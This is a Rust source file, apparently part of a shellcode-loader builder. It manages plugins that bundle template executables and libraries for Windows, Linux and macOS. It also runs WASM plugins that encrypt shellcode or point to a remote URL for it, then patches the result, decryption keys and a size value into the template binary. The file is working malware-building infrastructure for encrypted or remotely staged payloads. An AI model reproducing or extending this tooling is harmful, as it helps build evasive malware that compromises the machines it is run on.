use std::{
    collections::HashMap,
    fs, iter,
    ops::Not,
    path::{Path, PathBuf},
    sync::OnceLock,
};

use anyhow::{anyhow, bail};
use bincode::{decode_from_slice, encode_to_vec, Decode, Encode};
use capnp::{
    message::{self, ReaderOptions},
    serialize_packed,
};

use crate::{
    plugin_capnp,
    plugin_system::{
        run_plugin, EncryptShellcodeInput, EncryptShellcodeOutput, FormatEncryptedShellcodeInput,
        FormatEncryptedShellcodeOutput, FormatUrlRemoteInput, FormatUrlRemoteOutput, Pass,
        UploadFinalShellcodeRemoteInput, UploadFinalShellcodeRemoteOutput,
    },
    utils, BinaryType, Platform, ShellcodeSaveType,
};

const BINCODE_PLUGINS_CONFIG: bincode::config::Configuration = bincode::config::standard();
pub static CONFIG_FILE_PATH: OnceLock<PathBuf> = OnceLock::new();

#[derive(Debug, Default, Clone)]
pub struct PluginInfo {
    pub plugin_name: String,
    pub author: String,
    pub version: String,
    pub desc: String,
}

impl PluginInfo {
    pub fn plugin_name(&self) -> &str {
        &self.plugin_name
    }

    pub fn author(&self) -> &str {
        &self.author
    }

    pub fn version(&self) -> &str {
        &self.version
    }

    pub fn desc(&self) -> &str {
        &self.desc
    }
}

#[derive(Debug, Default, Clone)]
pub struct PluginReplace {
    pub src_prefix: Vec<u8>,
    pub size_holder: Option<Vec<u8>>,
    pub max_len: u64,
}

impl PluginReplace {
    pub fn src_prefix(&self) -> &[u8] {
        &self.src_prefix
    }

    pub fn size_holder(&self) -> Option<&Vec<u8>> {
        self.size_holder.as_ref()
    }

    pub fn max_len(&self) -> usize {
        self.max_len as usize
    }
}

#[derive(Debug, Default, Clone)]
pub struct Bins {
    pub executable: Option<Vec<u8>>,
    pub dynamic_library: Option<Vec<u8>>,
}

impl Bins {
    pub fn is_platform_supported(&self) -> bool {
        matches!((self.executable(), self.dynamic_library()), (None, None)).not()
    }

    pub fn supported_binary_types(&self) -> Vec<BinaryType> {
        let mut bin_types = Vec::default();
        if self.executable().is_some() {
            bin_types.push(BinaryType::Executable);
        }
        if self.dynamic_library().is_some() {
            bin_types.push(BinaryType::DynamicLibrary);
        }

        bin_types
    }
}

impl Bins {
    pub fn executable(&self) -> Option<&Vec<u8>> {
        self.executable.as_ref()
    }

    pub fn dynamic_library(&self) -> Option<&Vec<u8>> {
        self.dynamic_library.as_ref()
    }

    pub fn executable_mut(&mut self) -> &mut Option<Vec<u8>> {
        &mut self.executable
    }

    pub fn dynamic_library_mut(&mut self) -> &mut Option<Vec<u8>> {
        &mut self.dynamic_library
    }
}

#[derive(Debug, Default, Clone)]
pub struct PluginBins {
    pub windows: Bins,
    pub linux: Bins,
    pub darwin: Bins,
}

impl PluginBins {
    pub fn supported_plaforms(&self) -> Vec<Platform> {
        let mut platforms = Vec::default();
        if self.windows().is_platform_supported() {
            platforms.push(Platform::Windows);
        }
        if self.linux().is_platform_supported() {
            platforms.push(Platform::Linux);
        }
        if self.darwin().is_platform_supported() {
            platforms.push(Platform::Darwin);
        }

        platforms
    }

    pub fn get_that_binary(&self, platform: Platform, bin_type: BinaryType) -> Vec<u8> {
        let platform = match platform {
            Platform::Windows => self.windows(),
            Platform::Linux => self.linux(),
            Platform::Darwin => self.darwin(),
        };

        match bin_type {
            BinaryType::Executable => platform.executable().unwrap().to_vec(),
            BinaryType::DynamicLibrary => platform.dynamic_library().unwrap().to_vec(),
        }
    }
}

impl PluginBins {
    pub fn windows(&self) -> &Bins {
        &self.windows
    }

    pub fn linux(&self) -> &Bins {
        &self.linux
    }

    pub fn darwin(&self) -> &Bins {
        &self.darwin
    }
}

#[derive(Debug, Default, Clone)]
pub struct PluginPlugins {
    pub encrypt_shellcode: Option<Vec<u8>>,
    pub format_encrypted_shellcode: Option<Vec<u8>>,
    pub format_url_remote: Option<Vec<u8>>,
    pub upload_final_shellcode_remote: Option<Vec<u8>>,
}

impl PluginPlugins {
    pub fn run_encrypt_shellcode(&self, path: &Path) -> anyhow::Result<EncryptShellcodeOutput> {
        let shellcode = fs::read(path)?;
        Ok(if let Some(wasm) = self.encrypt_shellcode() {
            let input = EncryptShellcodeInput { shellcode };
            let res = run_plugin(wasm, "encrypt_shellcode", &input)?;
            serde_json::from_slice(res.as_slice())?
        } else {
            EncryptShellcodeOutput {
                encrypted: shellcode,
                ..Default::default()
            }
        })
    }

    pub fn run_format_encrypted_shellcode(
        &self,
        shellcode: &[u8],
    ) -> anyhow::Result<FormatEncryptedShellcodeOutput> {
        let shellcode = shellcode.to_owned();
        Ok(if let Some(wasm) = self.format_encrypted_shellcode() {
            let input = FormatEncryptedShellcodeInput { shellcode };
            let res = run_plugin(wasm, "format_encrypted_shellcode", &input)?;
            serde_json::from_slice(res.as_slice())?
        } else {
            FormatEncryptedShellcodeOutput {
                formated_shellcode: shellcode,
            }
        })
    }

    pub fn run_format_url_remote(&self, url: &str) -> anyhow::Result<FormatUrlRemoteOutput> {
        let url = url.to_owned();
        Ok(if let Some(wasm) = self.format_url_remote() {
            let input = FormatUrlRemoteInput { url };
            let res = run_plugin(wasm, "format_url_remote", &input)?;
            serde_json::from_slice(res.as_slice())?
        } else {
            FormatUrlRemoteOutput { formated_url: url }
        })
    }

    pub fn run_upload_final_shellcode_remote(
        &self,
        final_shellcode: &[u8],
    ) -> anyhow::Result<UploadFinalShellcodeRemoteOutput> {
        let final_shellcode = final_shellcode.to_owned();
        Ok(if let Some(wasm) = self.upload_final_shellcode_remote() {
            let input = UploadFinalShellcodeRemoteInput { final_shellcode };
            let res = run_plugin(wasm, "upload_final_shellcode_remote", &input)?;
            serde_json::from_slice(res.as_slice())?
        } else {
            UploadFinalShellcodeRemoteOutput::default()
        })
    }
}

impl PluginPlugins {
    pub fn encrypt_shellcode(&self) -> Option<&Vec<u8>> {
        self.encrypt_shellcode.as_ref()
    }

    pub fn format_encrypted_shellcode(&self) -> Option<&Vec<u8>> {
        self.format_encrypted_shellcode.as_ref()
    }

    pub fn format_url_remote(&self) -> Option<&Vec<u8>> {
        self.format_url_remote.as_ref()
    }

    pub fn upload_final_shellcode_remote(&self) -> Option<&Vec<u8>> {
        self.upload_final_shellcode_remote.as_ref()
    }

    pub fn encrypt_shellcode_mut(&mut self) -> &mut Option<Vec<u8>> {
        &mut self.encrypt_shellcode
    }

    pub fn format_encrypted_shellcode_mut(&mut self) -> &mut Option<Vec<u8>> {
        &mut self.format_encrypted_shellcode
    }

    pub fn format_url_remote_mut(&mut self) -> &mut Option<Vec<u8>> {
        &mut self.format_url_remote
    }

    pub fn upload_final_shellcode_remote_mut(&mut self) -> &mut Option<Vec<u8>> {
        &mut self.upload_final_shellcode_remote
    }
}

#[derive(Debug, Default, Clone)]
pub struct Plugin {
    pub version: String,
    pub info: PluginInfo,
    pub replace: PluginReplace,
    pub bins: PluginBins,
    pub plugins: PluginPlugins,
}

impl Plugin {
    pub fn decode_from_slice(data: &[u8]) -> anyhow::Result<Self> {
        let message = serialize_packed::read_message(data, ReaderOptions::new())?;
        let plugin = message.get_root::<plugin_capnp::plugin::Reader>()?;

        let info = plugin.get_info()?;
        let replace = plugin.get_replace()?;
        let bins = plugin.get_bins()?;
        let plugins = plugin.get_plugins()?;

        let check_empty = |bin: &[u8]| {
            if bin.is_empty() {
                None
            } else {
                Some(bin.to_vec())
            }
        };

        Ok(Self {
            version: plugin.get_version()?.to_string()?,
            info: PluginInfo {
                plugin_name: info.get_plugin_name()?.to_string()?,
                author: info.get_author()?.to_string()?,
                version: info.get_version()?.to_string()?,
                desc: info.get_desc()?.to_string()?,
            },
            replace: PluginReplace {
                src_prefix: replace.get_src_prefix()?.to_vec(),
                size_holder: check_empty(replace.get_size_holder()?),
                max_len: replace.get_max_len(),
            },
            bins: PluginBins {
                windows: {
                    let platform_bins = bins.get_windows()?;
                    Bins {
                        executable: check_empty(platform_bins.get_executable()?),
                        dynamic_library: check_empty(platform_bins.get_dynamic_library()?),
                    }
                },
                linux: {
                    let platform_bins = bins.get_linux()?;
                    Bins {
                        executable: check_empty(platform_bins.get_executable()?),
                        dynamic_library: check_empty(platform_bins.get_dynamic_library()?),
                    }
                },
                darwin: {
                    let platform_bins = bins.get_darwin()?;
                    Bins {
                        executable: check_empty(platform_bins.get_executable()?),
                        dynamic_library: check_empty(platform_bins.get_dynamic_library()?),
                    }
                },
            },
            plugins: PluginPlugins {
                encrypt_shellcode: check_empty(plugins.get_encrypt_shellcode()?),
                format_encrypted_shellcode: check_empty(plugins.get_format_encrypted_shellcode()?),
                format_url_remote: check_empty(plugins.get_format_url_remote()?),
                upload_final_shellcode_remote: check_empty(
                    plugins.get_upload_final_shellcode_remote()?,
                ),
            },
        })
    }

    pub fn encode_to_vec(&self) -> anyhow::Result<Vec<u8>> {
        let mut message = message::Builder::new_default();
        let mut plugin = message.init_root::<plugin_capnp::plugin::Builder>();
        plugin.set_version(self.version());

        let mut info = plugin.reborrow().init_info();
        let plugin_info = self.info();
        info.set_plugin_name(plugin_info.plugin_name());
        info.set_author(plugin_info.author());
        info.set_version(plugin_info.version());
        info.set_desc(plugin_info.desc());

        let mut replace = plugin.reborrow().init_replace();
        let plugin_replace = self.replace();
        replace.set_src_prefix(plugin_replace.src_prefix());
        if let Some(size_holder) = plugin_replace.size_holder() {
            replace.set_size_holder(size_holder);
        }
        replace.set_max_len(plugin_replace.max_len() as u64);

        let mut bins = plugin.reborrow().init_bins();
        if self.bins().windows().is_platform_supported() {
            let mut builder = bins.reborrow().init_windows();
            let platform_bins = self.bins().windows();

            if let Some(bin) = platform_bins.executable() {
                builder.set_executable(bin);
            }
            if let Some(bin) = platform_bins.dynamic_library() {
                builder.set_dynamic_library(bin);
            }
        }
        if self.bins().linux().is_platform_supported() {
            let mut builder = bins.reborrow().init_linux();
            let platform_bins = self.bins().linux();

            if let Some(bin) = platform_bins.executable() {
                builder.set_executable(bin);
            }
            if let Some(bin) = platform_bins.dynamic_library() {
                builder.set_dynamic_library(bin);
            }
        }
        if self.bins().darwin().is_platform_supported() {
            let mut builder = bins.reborrow().init_darwin();
            let platform_bins = self.bins().darwin();

            if let Some(bin) = platform_bins.executable() {
                builder.set_executable(bin);
            }
            if let Some(bin) = platform_bins.dynamic_library() {
                builder.set_dynamic_library(bin);
            }
        }

        let mut plugins = plugin.reborrow().init_plugins();
        let plugin_plugins = self.plugins();
        if let Some(plugin) = plugin_plugins.encrypt_shellcode() {
            plugins.set_encrypt_shellcode(plugin);
        }
        if let Some(plugin) = plugin_plugins.format_encrypted_shellcode() {
            plugins.set_format_encrypted_shellcode(plugin);
        }
        if let Some(plugin) = plugin_plugins.format_url_remote() {
            plugins.set_format_url_remote(plugin);
        }
        if let Some(plugin) = plugin_plugins.upload_final_shellcode_remote() {
            plugins.set_upload_final_shellcode_remote(plugin);
        }

        let mut buf = Vec::new();
        serialize_packed::write_message(&mut buf, &message)?;

        anyhow::Ok(buf)
    }

    pub fn replace_binary(
        &self,
        bin: &mut [u8],
        shellcode_src: String,
        mut pass: Vec<Pass>,
    ) -> anyhow::Result<()> {
        let save_type = if self.replace().size_holder().is_some() {
            ShellcodeSaveType::Local
        } else {
            ShellcodeSaveType::Remote
        };

        // replace shellcode src
        let shellcode_src = match save_type {
            ShellcodeSaveType::Local => {
                let path = Path::new(&shellcode_src);
                let output = self.plugins().run_encrypt_shellcode(path)?;
                pass = output.pass().to_vec();

                let final_shellcode = self
                    .plugins()
                    .run_format_encrypted_shellcode(output.encrypted())?;

                final_shellcode.formated_shellcode().to_vec()
            }
            ShellcodeSaveType::Remote => {
                let mut shellcode_src = self
                    .plugins()
                    .run_format_url_remote(&shellcode_src)?
                    .formated_url()
                    .as_bytes()
                    .to_vec();
                shellcode_src.push(b'\0');

                shellcode_src
            }
        };

        if shellcode_src.len() > self.replace().max_len() {
            bail!(
                "{} too long.",
                match save_type {
                    ShellcodeSaveType::Local => "Shellcode",
                    ShellcodeSaveType::Remote => "Shellcode Url",
                }
            );
        }

        utils::replace(
            bin,
            self.replace().src_prefix(),
            shellcode_src.as_slice(),
            self.replace().max_len(),
        );

        // replace pass
        for pass in pass {
            let holder = pass.holder();
            let replace_by = pass.replace_by();

            utils::replace(bin, holder, replace_by, holder.len());
        }

        // replace size_holder
        if save_type == ShellcodeSaveType::Local {
            let size_holder = self.replace().size_holder().unwrap();
            let shellcode_len_bytes = shellcode_src.len().to_string().as_bytes().to_vec();

            if shellcode_len_bytes.len() > size_holder.len() {
                bail!("Shellcode size bytes too long.");
            }

            let mut size_bytes: Vec<u8> = iter::repeat(b'0')
                .take(size_holder.len() - shellcode_len_bytes.len())
                .collect();
            size_bytes.extend_from_slice(shellcode_len_bytes.as_slice());

            utils::replace(bin, size_holder, size_bytes.as_slice(), size_holder.len());
        }

        Ok(())
    }
}

impl Plugin {
    pub fn version(&self) -> &str {
        &self.version
    }

    pub fn info(&self) -> &PluginInfo {
        &self.info
    }

    pub fn replace(&self) -> &PluginReplace {
        &self.replace
    }

    pub fn bins(&self) -> &PluginBins {
        &self.bins
    }

    pub fn plugins(&self) -> &PluginPlugins {
        &self.plugins
    }
}

#[derive(Debug, Clone, Default, Encode, Decode, PartialEq, Eq)]
pub struct Plugins(HashMap<String, Vec<u8>>);

impl Plugins {
    pub fn reade_plugins() -> anyhow::Result<Plugins> {
        let plugins_path = CONFIG_FILE_PATH
            .get()
            .ok_or(anyhow!("Get config file path failed."))?;

        let buf = fs::read(plugins_path)?;
        let (plugins, _) = decode_from_slice(buf.as_slice(), BINCODE_PLUGINS_CONFIG)?;
        Ok(plugins)
    }

    pub fn uptade_plugins(&self) -> anyhow::Result<()> {
        let buf = encode_to_vec(self, BINCODE_PLUGINS_CONFIG)?;
        let plugins_path = CONFIG_FILE_PATH
            .get()
            .ok_or(anyhow!("Get config file path failed."))?;

        if plugins_path.is_dir() {
            fs::remove_dir(plugins_path)?;
        }

        fs::write(plugins_path, buf)?;

        Ok(())
    }

    pub fn get(&self, name: &str) -> anyhow::Result<Plugin> {
        let buf = self
            .0
            .get(name)
            .ok_or(anyhow!("Get plugin by name failed."))?;

        Plugin::decode_from_slice(buf)
    }

    pub fn get_sorted_names(&self) -> Vec<String> {
        let mut names: Vec<String> = self.0.keys().map(|x| x.to_owned()).collect();
        names.sort();
        names
    }

    pub fn is_empty(&self) -> bool {
        self.0.is_empty()
    }

    pub fn insert(&mut self, name: String, plugin: Vec<u8>) {
        self.0.insert(name, plugin);
    }

    pub fn remove(&mut self, name: &str) {
        self.0.remove(name);
    }
}
